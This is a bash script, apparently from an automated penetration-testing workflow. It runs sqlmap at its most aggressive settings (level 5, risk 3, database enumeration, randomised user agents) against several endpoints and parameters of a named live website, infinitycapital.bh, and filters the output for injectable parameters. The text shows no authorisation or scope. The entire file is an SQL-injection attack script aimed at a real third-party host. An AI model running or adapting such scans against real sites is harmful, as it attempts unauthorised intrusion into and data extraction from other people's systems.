#!/bin/bash
# Required sqlmap run: every discovered parameter, level=5 risk=3
cd "$WORK_PATH"
mkdir -p tool_outputs
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome Safari/537.36'
IMG='https%3A%2F%2Fimages.ctfassets.net%2Fyts1dx0j7jj5%2F1GCT0vyjqmOwm2OL1YVpD1%2F2ab55f8b5189afa153eac5cb97f7f6d4%2FAhmed_Taleb_updated-min.jpg'

run() {
  name="$1"; shift
  timeout 900 sqlmap -u "$1" "${@:2}" \
    --batch --level=5 --risk=3 --dbs --threads=4 \
    --random-agent --timeout=20 --retries=1 \
    --output-dir="$WORK_PATH/tool_outputs/sqlmap" \
    > "tool_outputs/sqlmap_${name}.out" 2>&1
  echo "== $name exit=$? =="
  grep -aiE 'is vulnerable|injectable|parameter .* testing|not injectable|does not seem to be injectable|HEURISTIC|TESTS' "tool_outputs/sqlmap_${name}.out" | head -12
}

run nextimage "https://www.infinitycapital.bh/_next/image?url=${IMG}&w=1080&q=75" -p "url,w,q"
run apiroot "https://www.infinitycapital.bh/api/" -p "id,q,search,page,query"
run p404 "https://www.infinitycapital.bh/404" -p "id,url,path,redirect,next,ref"
run home "https://www.infinitycapital.bh/?id=1&search=test&page=2" -p "id,search,page"
echo "=== DONE ==="
